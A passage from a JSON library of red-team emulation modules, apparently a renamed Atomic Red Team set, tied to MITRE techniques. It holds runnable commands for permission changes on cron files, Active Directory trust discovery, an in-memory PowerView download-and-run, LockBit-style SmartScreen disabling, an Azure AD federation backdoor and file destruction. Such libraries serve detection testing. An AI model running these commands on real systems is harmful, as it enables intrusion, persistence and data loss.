      "module_name": "chmod - Change file or folder mode (numeric mode)"
    },
    {
      "index": 1069,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "chmod #{symbolic_mode} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "symbolic_mode",
          "description": "Specified symbolic mode value",
          "type": "string",
          "default_value": "a+w"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fc9d6695-d022-4a80-91b1-381f5c35aff3",
      "module_name": "chmod - Change file or folder mode (symbolic mode)"
    },
    {
      "index": 1070,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "chmod -R #{numeric_mode} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "numeric_mode",
          "description": "Specified numeric mode value",
          "type": "integer",
          "default_value": 755
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ea79f937-4a4d-4348-ace6-9916aec453a4",
      "module_name": "chmod - Change file or folder mode (numeric mode) recursively"
    },
    {
      "index": 1071,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "chmod -R #{symbolic_mode} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "symbolic_mode",
          "description": "Specified symbolic mode value",
          "type": "string",
          "default_value": "a+w"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0451125c-b5f6-488f-993b-5a32b09f7d8f",
      "module_name": "chmod - Change file or folder mode (symbolic mode) recursively"
    },
    {
      "index": 1072,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's ownership and group information using chown.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "chown #{owner}:#{group} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "owner",
          "description": "Username of desired owner",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002/T1222.002.yaml"
        },
        {
          "name": "group",
          "description": "Group name of desired group",
          "type": "string",
          "default_value": "root"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d169e71b-85f9-44ec-8343-27093ff3dfc0",
      "module_name": "chown - Change file or folder ownership and group"
    },
    {
      "index": 1073,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's ownership and group information recursively using chown.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "chown -R #{owner}:#{group} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "owner",
          "description": "Username of desired owner",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        },
        {
          "name": "group",
          "description": "Group name of desired group",
          "type": "string",
          "default_value": "root"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b78598be-ff39-448f-a463-adbf2a5b7848",
      "module_name": "chown - Change file or folder ownership and group recursively"
    },
    {
      "index": 1074,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's ownership only using chown.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "chown #{owner} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "owner",
          "description": "Username of desired owner",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002/T1222.002.yaml"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "967ba79d-f184-4e0e-8d09-6362b3162e99",
      "module_name": "chown - Change file or folder mode ownership only"
    },
    {
      "index": 1075,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's ownership only recursively using chown.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "chown -R #{owner} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "owner",
          "description": "Username of desired owner",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3b015515-b3d8-44e9-b8cd-6fa84faf30b2",
      "module_name": "chown - Change file or folder ownership recursively"
    },
    {
      "index": 1076,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "chattr -i #{file_to_modify}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "Path of the file",
          "type": "path",
          "default_value": "/var/spool/cron/root"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e7469fe2-ad41-4382-8965-99b94dd3c13f",
      "module_name": "chattr - Remove immutable file attribute"
    },
    {
      "index": 1077,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Remove's a file's `immutable` attribute using `chflags`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "touch #{file_to_modify}\nchflags simmutable #{file_to_modify}\nchflags nosimmutable #{file_to_modify}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "Path of the file",
          "type": "path",
          "default_value": "/tmp/T1222.002.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "60eee3ea-2ebd-453b-a666-c52ce08d2709",
      "module_name": "chflags - Remove immutable file attribute"
    },
    {
      "index": 1078,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "chmods a file using a c script\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "#{compiled_file} /tmp/ T1222002\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file",
          "description": "Path of c source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1222.002/src/T1222.002.c"
        },
        {
          "name": "compiled_file",
          "description": "Path of compiled file",
          "type": "path",
          "default_value": "/tmp/T1222002"
        }
      ],
      "prerequisites": [
        {
          "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
          "check_command": "gcc #{source_file} -o #{compiled_file}\n",
          "install_command": "gcc #{source_file} -o #{compiled_file}\n"
        }
      ],
      "rx_module_id": "973631cf-6680-4ffa-a053-045e1b6b67ab",
      "module_name": "Chmod through c script"
    },
    {
      "index": 1079,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "chmods a file using a c script\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "#{compiled_file} /tmp/ T1222002\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file",
          "description": "Path of c source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1222.002/src/T1222.002.c"
        },
        {
          "name": "compiled_file",
          "description": "Path of compiled file",
          "type": "path",
          "default_value": "/tmp/T1222002"
        }
      ],
      "prerequisites": [
        {
          "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
          "check_command": "cc #{source_file} -o #{compiled_file}\n",
          "install_command": "cc #{source_file} -o #{compiled_file}\n"
        }
      ],
      "rx_module_id": "da40b5fe-3098-4b3b-a410-ff177e49ee2e",
      "module_name": "Chmod through c script (freebsd)"
    },
    {
      "index": 1080,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "chowns a file to root using a c script\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo #{compiled_file} #{source_file}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file",
          "description": "Path of c source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1222.002/src/chown.c"
        },
        {
          "name": "compiled_file",
          "description": "Path of compiled file",
          "type": "path",
          "default_value": "/tmp/T1222002own"
        }
      ],
      "prerequisites": [
        {
          "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
          "check_command": "gcc #{source_file} -o #{compiled_file}\n",
          "install_command": "gcc #{source_file} -o #{compiled_file}\n"
        }
      ],
      "rx_module_id": "18592ba1-5f88-4e3c-abc8-ab1c6042e389",
      "module_name": "Chown through c script"
    },
    {
      "index": 1081,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "chowns a file to root using a c script\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "#{compiled_file} #{source_file}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file",
          "description": "Path of c source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1222.002/src/chown.c"
        },
        {
          "name": "compiled_file",
          "description": "Path of compiled file",
          "type": "path",
          "default_value": "/tmp/T1222002own"
        }
      ],
      "prerequisites": [
        {
          "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
          "check_command": "cc #{source_file} -o #{compiled_file}\n",
          "install_command": "cc #{source_file} -o #{compiled_file}\n"
        }
      ],
      "rx_module_id": "eb577a19-b730-4918-9b03-c5edcf51dc4e",
      "module_name": "Chown through c script (freebsd)"
    },
    {
      "index": 1082,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4700a710-c821-4e17-a3ec-9e4c81d6845f",
      "module_name": "Windows - Discover domain trusts with dsquery"
    },
    {
      "index": 1083,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "nltest /domain_trusts\nnltest /trusted_domains\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "nltest.exe from RSAT must be present on disk\n",
          "check_command": "WHERE nltest.exe >NUL 2>&1\n",
          "install_command": "echo Sorry RSAT must be installed manually\n"
        }
      ],
      "rx_module_id": "2e22641d-0498-48d2-b9ff-c71e496ccdbe",
      "module_name": "Windows - Discover domain trusts with nltest"
    },
    {
      "index": 1084,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "PowerView PowerShell script must exist on disk\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
        },
        {
          "description": "RSAT PowerShell AD admin cmdlets must be installed\n",
          "check_command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n",
          "install_command": "Write-Host \"Sorry RSAT must be installed manually\"\n"
        }
      ],
      "rx_module_id": "c58fbc62-8a62-489e-8f2d-3565d7d96f30",
      "module_name": "Powershell enumerate domains and forests"
    },
    {
      "index": 1085,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit) #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec",
      "module_name": "Adfind - Enumerate Active Directory OUs"
    },
    {
      "index": 1086,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -gcb -sc trustdmp\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "15fe436d-e771-4ff3-b655-2dca9ba52834",
      "module_name": "Adfind - Enumerate Active Directory Trusts"
    },
    {
      "index": 1087,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f974894c-5991-4b19-aaf5-7cc2fe298c5d",
      "module_name": "Get-DomainTrust with PowerView"
    },
    {
      "index": 1088,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "58ed10e8-0738-4651-8408-3a3e9a526279",
      "module_name": "Get-ForestTrust with PowerView"
    },
    {
      "index": 1089,
      "technique_id": "T1482",
      "technique_name": "Domain Trust Discovery",
      "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{trufflesnout_path}\" forest -n #{domain}\n\"#{trufflesnout_path}\" domain -n #{domain}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "trufflesnout_path",
          "description": "Path to the TruffleSnout executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\TruffleSnout.exe"
        },
        {
          "name": "domain",
          "description": "Domain name to search on",
          "type": "string",
          "default_value": "%userdomain%"
        }
      ],
      "prerequisites": [
        {
          "description": "TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})\n",
          "check_command": "if (Test-Path \"#{trufflesnout_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"#{trufflesnout_path}\") -Force | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe\" -OutFile \"#{trufflesnout_path}\"\n"
        }
      ],
      "rx_module_id": "ea1b4f2d-5b82-4006-b64f-f2845608a3bf",
      "module_name": "TruffleSnout - Listing AD Infrastructure"
    },
    {
      "index": 1090,
      "technique_id": "T1484.001",
      "technique_name": "Domain Policy Modification: Group Policy Modification",
      "description": "An adversary can modify the group policy settings.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9ab80952-74ee-43da-a98c-1e740a985f28",
      "module_name": "LockBit Black - Modify Group policy settings -cmd"
    },
    {
      "index": 1091,
      "technique_id": "T1484.001",
      "technique_name": "Domain Policy Modification: Group Policy Modification",
      "description": "An adversary modifies group policy settings\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b51eae65-5441-4789-b8e8-64783c26c1d1",
      "module_name": "LockBit Black - Modify Group policy settings -Powershell"
    },
    {
      "index": 1092,
      "technique_id": "T1484.002",
      "technique_name": "Domain Trust Modification",
      "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n",
        "elevation_required": false,
        "cleanup_command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}\n"
      },
      "variables": [
        {
          "name": "azure_username",
          "description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles",
          "type": "string",
          "default_value": "bruce.wayne@contosocloud.com"
        },
        {
          "name": "azure_password",
          "description": "Password of azure_username",
          "type": "string",
          "default_value": "iamthebatman"
        },
        {
          "name": "domain_name",
          "description": "Malicious federated domain name",
          "type": "string",
          "default_value": "contoso.com"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
          "check_command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force\n"
        }
      ],
      "rx_module_id": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7",
      "module_name": "Add Federation to Azure AD"
    },
    {
      "index": 1093,
      "technique_id": "T1485",
      "technique_name": "Data Destruction",
      "description": "Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (-not (Test-Path \"#{file_to_delete}\")) { New-Item \"#{file_to_delete}\" -Force }\n& \"#{sdelete_exe}\" -accepteula \"#{file_to_delete}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "sdelete_exe",
          "description": "Path of sdelete executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe"
        },
        {
          "name": "file_to_delete",
          "description": "Path of file to delete",
